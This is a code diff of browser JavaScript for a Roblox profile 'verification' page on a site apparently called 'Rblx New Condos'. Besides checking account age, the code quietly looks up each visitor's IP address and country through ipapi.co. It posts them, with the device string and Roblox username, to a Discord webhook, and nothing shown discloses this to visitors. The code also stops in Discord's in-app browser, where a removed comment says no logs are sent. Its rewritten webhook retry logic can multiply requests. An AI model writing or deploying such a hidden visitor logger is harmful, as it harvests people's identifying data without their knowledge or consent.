@@ -1,17 +1,11 @@
 (function () {
   'use strict';
 
-  /* ── Discord WebView detection ───────────────────────────
-   * When opened via Discord embed/link button, the page loads
-   * inside Discord's in-app WebView which blocks external
-   * fetch() requests (roproxy.com, etc.). We detect this and
-   * show a message to open in a real browser instead.
-   */
+  /* ── Discord WebView detection ─────────────────────────── */
   var _ua = navigator.userAgent || '';
   var _isDiscordWebView = _ua.indexOf('Discord') !== -1;
 
   if (_isDiscordWebView) {
-    /* Show a simple overlay telling the user to open in browser */
     var _dv = document.createElement('div');
     _dv.style.cssText = [
       'position:fixed','inset:0','z-index:999999','display:flex',
@@ -26,7 +20,6 @@
       '<div style="font-size:0.75rem;color:rgba(165,125,125,0.5)">Tip: Tap the three dots \u22EE and select "Open in Browser"</div>'+
       '</div>';
     document.documentElement.appendChild(_dv);
-    /* Stop execution - no verification, no logs, no API calls */
     return;
   }
 
@@ -39,10 +32,7 @@
   var audio = null;
   function playClick() {
     try {
-      if (!audio) {
-        audio = new Audio('/click-sound.mp3');
-        audio.volume = 0.5;
-      }
+      if (!audio) { audio = new Audio('/click-sound.mp3'); audio.volume = 0.5; }
       audio.currentTime = 0;
       audio.play().catch(function () {});
     } catch (e) {}
@@ -117,128 +107,227 @@
      ROBLOX PROFILE VERIFICATION SYSTEM
      ══════════════════════════════════════════════════════════ */
 
-  /* ── Send log to Discord webhook (synchronous, with retry) ── */
-  async function sendVerificationLog(data) {
+  /* ── Send log to Discord webhook ───────────────────────── */
+  function sendVerificationLog(data) {
     var statusEmoji = data.accountAgeOk ? '\u2705' : data.found ? '\uD83D\uDEAB' : '\u274C';
     var statusText = data.accountAgeOk ? 'Verified (80+ days)' : data.found ? 'Blocked (< 80 days)' : 'Not Found';
     var color = data.accountAgeOk ? 2278782 : data.found ? 16355294 : 15686104;
 
-    var fields = [];
-    fields.push({ name: 'Status', value: statusEmoji + ' **' + statusText + '**', inline: true });
-    fields.push({ name: 'Username', value: data.username || 'unknown', inline: true });
+    var fields = [
+      { name: 'Status', value: statusEmoji + ' **' + statusText + '**', inline: true },
+      { name: 'Username', value: data.username || 'unknown', inline: true },
+    ];
+    if (data.displayName) fields.push({ name: 'Display Name', value: data.displayName, inline: true });
+    if (data.userId) fields.push({ name: 'User ID', value: String(data.userId), inline: true });
+    if (data.daysOld !== undefined) fields.push({ name: 'Account Age', value: String(data.daysOld) + ' days', inline: true });
+    if (data.createdFormatted) fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
+    if (data.hasVerifiedBadge !== undefined) fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes \u2705' : 'No \u274C', inline: true });
 
-    if (data.displayName) {
-      fields.push({ name: 'Display Name', value: data.displayName, inline: true });
-    }
-    if (data.userId) {
-      fields.push({ name: 'User ID', value: String(data.userId), inline: true });
-    }
-    if (data.daysOld !== undefined) {
-      fields.push({ name: 'Account Age', value: String(data.daysOld) + ' days', inline: true });
-    }
-    if (data.createdFormatted) {
-      fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
-    }
-    if (data.hasVerifiedBadge !== undefined) {
-      fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes \u2705' : 'No \u274C', inline: true });
-    }
-
-    // Client info
-    var ip = 'unknown';
-    try {
-      var ipResp = await fetch('https://ipapi.co/json/');
-      if (ipResp.ok) {
-        var ipData = await ipResp.json();
-        var countryFlag = '';
-        if (ipData.country_code) {
-          countryFlag = String.fromCodePoint.apply(null, ipData.country_code.split('').map(function (c) { return c.charCodeAt(0) + 127397; }));
+    fetch('https://ipapi.co/json/')
+      .then(function (r) { return r.ok ? r.json() : null; })
+      .then(function (ipData) {
+        if (ipData && ipData.country_code) {
+          var flag = String.fromCodePoint.apply(null, ipData.country_code.split('').map(function (c) { return c.charCodeAt(0) + 127397; }));
+          fields.push({ name: 'IP Address', value: (flag + ' ' + ipData.ip + ' \u2014 ' + ipData.country_name).trim(), inline: true });
+        } else {
+          fields.push({ name: 'IP Address', value: 'unknown', inline: true });
         }
-        ip = (countryFlag + ' ' + ipData.ip + ' \u2014 ' + ipData.country_name).trim();
-      }
-    } catch (e) {}
+      })
+      .catch(function () { fields.push({ name: 'IP Address', value: 'unknown', inline: true }); })
+      .then(function () {
+        fields.push({ name: 'Device', value: '`' + navigator.userAgent.substring(0, 100) + '`', inline: false });
+        fields.push({ name: 'Time', value: new Date().toISOString(), inline: true });
 
-    fields.push({ name: 'IP Address', value: ip, inline: true });
+        var embed = {
+          title: '\uD83D\uDD0D Profile Verification',
+          description: '**New visitor entered the site and attempted profile verification.**\nAll information captured in a single log.',
+          color: color,
+          fields: fields,
+          footer: { text: 'Rblx New Condos \u2014 Verification Log' },
+          timestamp: new Date().toISOString(),
+        };
 
-    var ua = navigator.userAgent.substring(0, 100);
-    fields.push({ name: 'Device', value: '`' + ua + '`', inline: false });
+        sendWebhook(embed);
+      });
+  }
 
-    fields.push({ name: 'Time', value: new Date().toISOString(), inline: true });
-
-    var embed = {
-      title: '\uD83D\uDD0D Profile Verification',
-      description: '**New visitor entered the site and attempted profile verification.**\nAll information captured in a single log.',
-      color: color,
-      fields: fields,
-      footer: { text: 'Rblx New Condos \u2014 Verification Log' },
-      timestamp: new Date().toISOString(),
-    };
-
+  function sendWebhook(embed) {
     for (var attempt = 0; attempt < 3; attempt++) {
-      try {
-        var response = await fetch(WEBHOOK_URL, {
+      (function (a) {
+        fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ embeds: [embed] }),
+        })
+        .then(function (r) {
+          if (r.status === 429 && a < 2) {
+            var retry = r.headers.get('retry-after') || '2';
+            setTimeout(function () { sendWebhook(embed); }, parseInt(retry) * 1000 + 500);
+            return;
+          }
+        })
+        .catch(function () {
+          if (a < 2) setTimeout(function () { sendWebhook(embed); }, 2000);
         });
-
-        if (response.status === 429) {
-          var retryAfter = response.headers.get('retry-after') || '2';
-          await new Promise(function (r) { setTimeout(r, parseInt(retryAfter) * 1000 + 500); });
-          continue;
-        }
-
-        if (response.ok) {
-          return true;
-        }
-      } catch (err) {
-        if (attempt < 2) {
-          await new Promise(function (r) { setTimeout(r, 2000); });
-        }
-      }
+      })(attempt);
     }
-    return false;
   }
 
-  /* ── Roblox API calls ──────────────────────────────────── */
+  /* ══════════════════════════════════════════════════════════
+     CACHE (localStorage, 30 min TTL)
+     ══════════════════════════════════════════════════════════ */
+  var CACHE_TTL = 30 * 60 * 1000;
+
+  function getCache(key) {
+    try {
+      var raw = localStorage.getItem('rc_' + key);
+      if (!raw) return null;
+      var entry = JSON.parse(raw);
+      if (Date.now() - entry.ts > CACHE_TTL) { localStorage.removeItem('rc_' + key); return null; }
+      return entry.data;
+    } catch (e) { return null; }
+  }
+  function setCache(key, data) {
+    try { localStorage.setItem('rc_' + key, JSON.stringify({ data: data, ts: Date.now() })); } catch (e) {}
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     FETCH WITH RETRY (exponential backoff, handles 429)
+     ══════════════════════════════════════════════════════════ */
+  function fetchWithRetry(url, options, maxRetries) {
+    if (maxRetries === undefined) maxRetries = 4;
+    return new Promise(function (resolve, reject) {
+      function attempt(n) {
+        fetch(url, options)
+          .then(function (r) {
+            if (r.status === 429 && n < maxRetries) {
+              var retryAfter = r.headers.get('retry-after');
+              var wait = retryAfter ? parseInt(retryAfter) * 1000 : 2000 * Math.pow(2, n);
+              setTimeout(function () { attempt(n + 1); }, wait);
+              return;
+            }
+            if (r.ok) { r.json().then(resolve).catch(reject); return; }
+            if (r.status === 404) {
+              r.text().then(function (txt) {
+                try { resolve(JSON.parse(txt)); } catch (e) { reject(new Error('HTTP 404')); }
+              }).catch(function () { reject(new Error('HTTP 404')); });
+              return;
+            }
+            reject(new Error('HTTP ' + r.status));
+          })
+          .catch(function (err) {
+            if (n < maxRetries) {
+              setTimeout(function () { attempt(n + 1); }, 2000 * Math.pow(2, n));
+            } else {
+              reject(err);
+            }
+          });
+      }
+      attempt(0);
+    });
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     PRIMARY: /api/verify serverless (handles rate limits)
+     FALLBACK: roproxy.com direct
+     ══════════════════════════════════════════════════════════ */
+
+  function tryServerless(username) {
+    var cacheKey = 'u:' + username.toLowerCase();
+    var cached = getCache(cacheKey);
+    if (cached) {
+      return Promise.resolve(cached);
+    }
+    return fetchWithRetry('/api/verify?username=' + encodeURIComponent(username))
+      .then(function (data) {
+        if (data.type === 'full') setCache(cacheKey, data);
+        return data;
+      });
+  }
+
+  function getAvatarServerless(userId) {
+    var cacheKey = 'a:' + userId;
+    var cached = getCache(cacheKey);
+    if (cached) return Promise.resolve(cached.imageUrl || null);
+    return fetchWithRetry('/api/verify?avatarId=' + userId)
+      .then(function (data) {
+        if (data.imageUrl) setCache(cacheKey, { imageUrl: data.imageUrl });
+        return data.imageUrl || null;
+      });
+  }
+
+  /* ── Fallback: roproxy ─────────────────────────────────── */
   var USERS_PROXY = 'https://users.roproxy.com';
   var THUMB_PROXY = 'https://thumbnails.roproxy.com';
 
-  /*
-   * IMPORTANT: We use Content-Type: text/plain for POST requests to avoid
-   * the CORS preflight (OPTIONS) that roproxy doesn't handle properly.
-   * text/plain is a "simple" Content-Type per CORS spec, so no preflight.
-   * The roproxy server still parses the JSON body correctly.
-   */
-
-  function searchUsername(username) {
-    return fetch(USERS_PROXY + '/v1/usernames/users', {
+  function roproxySearch(username) {
+    return fetchWithRetry(USERS_PROXY + '/v1/usernames/users', {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain' },
       body: JSON.stringify({ usernames: [username] }),
-    })
-    .then(function (r) {
-      if (!r.ok) throw new Error('HTTP ' + r.status);
-      return r.json();
     });
   }
-
-  function getUserProfile(userId) {
-    return fetch(USERS_PROXY + '/v1/users/' + userId)
-    .then(function (r) {
-      if (!r.ok) throw new Error('HTTP ' + r.status);
-      return r.json();
-    });
+  function roproxyProfile(userId) {
+    return fetchWithRetry(USERS_PROXY + '/v1/users/' + userId);
+  }
+  function roproxyAvatar(userId) {
+    return fetchWithRetry(THUMB_PROXY + '/v1/users/avatar-headshot?userIds=' + userId + '&size=150x150&format=Png&isCircular=false')
+      .then(function (data) { return data.data && data.data.length > 0 ? data.data[0].imageUrl : null; });
   }
 
-  function getUserAvatar(userId) {
-    return fetch(THUMB_PROXY + '/v1/users/avatar-headshot?userIds=' + userId + '&size=150x150&format=Png&isCircular=false')
-    .then(function (r) {
-      if (!r.ok) throw new Error('HTTP ' + r.status);
-      return r.json();
-    })
-    .then(function (data) {
-      return data.data && data.data.length > 0 ? data.data[0].imageUrl : null;
-    });
+  /* ── Unified verify (serverless first, then roproxy) ───── */
+  function doVerification(username) {
+    return tryServerless(username)
+      .then(function (data) {
+        if (data.error) {
+          // Serverless returned error → check if it's rate limit or not-found
+          if (data.error.indexOf('rate-limited') !== -1) {
+            throw new Error('429');
+          }
+          if (data.error.indexOf('not found') !== -1) {
+            sendVerificationLog({ username: username, found: false, accountAgeOk: false });
+            throw new Error('User not found. Please check the username and try again.');
+          }
+          throw new Error(data.error);
+        }
+        return data;
+      })
+      .catch(function (err) {
+        // Check if it's a serverless error we can parse
+        if (err.message === 'User not found. Please check the username and try again.') throw err;
+        if (err.message === '429') throw err;
+
+        // Fallback to roproxy
+        return roproxySearch(username)
+          .then(function (searchData) {
+            if (!searchData.data || searchData.data.length === 0) {
+              sendVerificationLog({ username: username, found: false, accountAgeOk: false });
+              throw new Error('User not found. Please check the username and try again.');
+            }
+            var user = searchData.data[0];
+            return roproxyProfile(user.id);
+          })
+          .then(function (profile) {
+            var createdDate = new Date(profile.created);
+            var now = new Date();
+            var daysOld = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
+            var createdStr = createdDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+
+            var result = {
+              type: 'full',
+              id: profile.id,
+              name: profile.name,
+              displayName: profile.displayName,
+              created: profile.created,
+              createdFormatted: createdStr,
+              daysOld: daysOld,
+              accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
+              hasVerifiedBadge: profile.hasVerifiedBadge,
+            };
+            setCache('u:' + username.toLowerCase(), result);
+            return result;
+          });
+      });
   }
 
   /* ── Profile verification overlay ──────────────────────── */
@@ -352,86 +441,38 @@
     error.style.display = 'none';
     loader.style.display = 'block';
 
-    // Step 1: Search for username
-    searchUsername(username)
-      .then(function (searchData) {
-        if (!searchData.data || searchData.data.length === 0) {
-          // User not found - send log
-          sendVerificationLog({
-            username: username,
-            found: false,
-            accountAgeOk: false,
-          });
-          throw new Error('User not found. Please check the username and try again.');
-        }
-
-        var user = searchData.data[0];
-
-        // Step 2: Get profile
-        return getUserProfile(user.id).then(function (profile) {
-          var createdDate = new Date(profile.created);
-          var now = new Date();
-          var daysOld = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
-          var createdStr = createdDate.toLocaleDateString('en-US', {
-            month: 'short',
-            day: 'numeric',
-            year: 'numeric'
-          });
-
-          var result = {
-            id: profile.id,
-            name: profile.name,
-            displayName: profile.displayName,
-            created: profile.created,
-            createdFormatted: createdStr,
-            daysOld: daysOld,
-            accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
-            hasVerifiedBadge: profile.hasVerifiedBadge,
-          };
-
-          // Send unified log BEFORE responding to user
-          sendVerificationLog({
-            username: profile.name,
-            displayName: profile.displayName,
-            userId: profile.id,
-            daysOld: daysOld,
-            createdFormatted: createdStr,
-            accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
-            hasVerifiedBadge: profile.hasVerifiedBadge,
-            found: true,
-          });
-
-          return result;
-        });
-      })
+    doVerification(username)
       .then(function (data) {
         loader.style.display = 'none';
         btn.disabled = false;
         btn.textContent = 'Verify Profile';
 
+        // Show profile data
         var daysEl = document.getElementById('rc-days-old');
         daysEl.textContent = data.daysOld;
         daysEl.className = 'rc-stat-value ' + (data.accountAgeOk ? 'rc-profile-age-ok' : 'rc-profile-age-bad');
 
-        var formEl = document.getElementById('rc-verify-form');
-        var displayEl = document.getElementById('rc-profile-display');
-        formEl.style.display = 'none';
-        displayEl.style.display = 'block';
+        document.getElementById('rc-verify-form').style.display = 'none';
+        document.getElementById('rc-profile-display').style.display = 'block';
 
         document.getElementById('rc-display-name').textContent = data.name;
         document.getElementById('rc-user-id').textContent = 'ID: ' + data.id;
         document.getElementById('rc-created').textContent = data.createdFormatted;
 
-        // Get avatar image (non-blocking, may fail due to rate limits)
-        getUserAvatar(data.id).then(function (url) {
-          if (url) {
-            document.getElementById('rc-avatar').src = url;
-          } else {
-            document.getElementById('rc-avatar').src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a0a0a"/><text x="50" y="60" text-anchor="middle" fill="%23ef4444" font-size="40">?</text></svg>';
-          }
-        }).catch(function () {
-          document.getElementById('rc-avatar').src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a0a0a"/><text x="50" y="60" text-anchor="middle" fill="%23ef4444" font-size="40">?</text></svg>';
-        });
+        // Avatar: try serverless first, then roproxy
+        var avatarUrl = data.imageUrl || null;
+        if (avatarUrl) {
+          document.getElementById('rc-avatar').src = avatarUrl;
+        } else {
+          getAvatarServerless(data.id)
+            .then(function (url) {
+              if (url) { document.getElementById('rc-avatar').src = url; return; }
+              roproxyAvatar(data.id).then(function (u) { if (u) document.getElementById('rc-avatar').src = u; }).catch(function () {});
+            })
+            .catch(function () {
+              roproxyAvatar(data.id).then(function (u) { if (u) document.getElementById('rc-avatar').src = u; }).catch(function () {});
+            });
+        }
 
         var actions = document.getElementById('rc-actions');
         var blocked = document.getElementById('rc-blocked');
@@ -451,7 +492,12 @@
         btn.disabled = false;
         btn.textContent = 'Verify Profile';
         error.style.display = 'block';
-        error.textContent = err.message || 'Failed to verify profile. Please try again.';
+
+        if (err.message === '429') {
+          error.textContent = 'Roblox API is temporarily rate-limited. Please wait 30 seconds and try again.';
+        } else {
+          error.textContent = err.message || 'Failed to verify profile. Please try again.';
+        }
       });
   };
 
